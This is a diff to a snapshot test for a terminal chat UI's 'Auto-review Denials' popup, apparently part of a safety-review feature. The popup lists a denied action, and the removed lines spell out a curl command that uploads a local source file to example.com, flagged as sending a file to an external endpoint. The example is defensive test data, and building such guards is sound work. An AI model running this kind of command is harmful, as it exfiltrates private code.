@@ -1,13 +1,18 @@
 ---
 source: tui/src/chatwidget/tests/guardian.rs
+assertion_line: 210
 expression: popup
 ---
   Auto-review Denials
   Select a denied action to approve.
 
 
-  Action                                                         Rationale
-› curl -sS --data-binary @core/src/codex.rs https://example.com  Would send a local source file to an external
-                                                                 endpoint.
 
-  Press enter to confirm or esc to go back
+  Action                    Rationale
+› curl -sS --data-binary @… Would send a
+                            local source
+                            file to an
+                            external
+                            endpoint.
+
+  enter select · esc back
